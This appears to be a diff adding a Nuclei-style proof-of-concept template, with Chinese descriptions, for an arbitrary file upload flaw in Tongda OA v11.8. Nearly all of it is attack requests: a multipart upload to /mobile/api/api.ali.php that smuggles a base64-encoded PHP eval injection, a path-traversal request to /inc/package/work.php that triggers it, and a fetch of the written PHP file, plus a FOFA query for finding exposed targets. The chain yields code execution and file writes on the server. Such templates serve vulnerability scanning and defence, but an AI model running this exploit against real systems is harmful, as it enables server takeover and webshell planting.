@@ -1,0 +1,62 @@
+id: poc-local-oa-tongda-v11_8-api-ali-php-upload
+
+info:
+  name: 通达OA v11.8 api.ali.php 任意文件上传漏洞
+  author: capiton
+  severity: critical
+  description: 通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    Vulnerability-Impact: 通达OA v11.8
+  tags: tongda
+
+variables:
+  random: "{{rand_int(10000,99999)}}"
+  md5_random: "{{md5(random)}}"
+  payload: "file_put_contents('../../{{randstr}}.php','<?php echo md5({{random}});?>');"
+  base64_payload: "{{base64(payload)}}"
+  date: '{{substr(date_time("%Y%M"),2,6)}}'
+
+requests:
+  - raw:
+      - |
+        POST /mobile/api/api.ali.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{randstr}}
+        Accept-Encoding: gzip
+
+        --{{randstr}}
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
+        Content-Type: application/octet-stream
+
+        {"modular":"AllVariable","a":"{{base64_payload}}","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
+        --{{randstr}}--
+
+      - |
+        POST /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{date}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.{{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        condition: and
+        name: upload
+        dsl:
+          - contains(body_2,"+OK")
+
+      - type: dsl
+        name: webshell
+        condition: and
+        dsl:
+          - contains(body_3,"{{md5_random}}")
